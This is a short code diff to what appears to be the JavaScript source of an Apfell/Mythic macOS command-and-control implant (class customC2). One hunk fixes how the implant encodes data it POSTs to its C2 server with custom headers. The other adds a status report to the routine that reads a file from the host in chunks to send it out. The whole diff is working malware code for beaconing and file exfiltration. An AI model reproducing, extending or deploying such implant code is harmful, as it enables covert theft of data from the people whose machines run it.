@@ -294,7 +294,7 @@ class customC2 extends baseC2{
 				if( (apfell.id === undefined || apfell.id === "") && (uid === undefined || uid === "")){ $.NSApplication.sharedApplication.terminate(this);}
 				let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
 				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
-				let postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
+				let postData = data.dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
 				let postLength = $.NSString.stringWithFormat("%d", postData.length);
 				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
 				for(let i = 0; i < this.header_list.length; i++){
@@ -440,6 +440,10 @@ class customC2 extends baseC2{
             let registerFile = this.postResponse(task, registerData);
             registerFile = registerFile['responses'][0];
             if (registerFile['status'] === "success"){
+            	this.postResponse(task, {"user_output": JSON.stringify({
+						"agent_file_id": registerFile["file_id"],
+						"total_chunks": numOfChunks
+					})});
                 handle.seekToFileOffset(0);
                 let currentChunk = 1;
                 let data = handle.readDataOfLength(chunkSize);
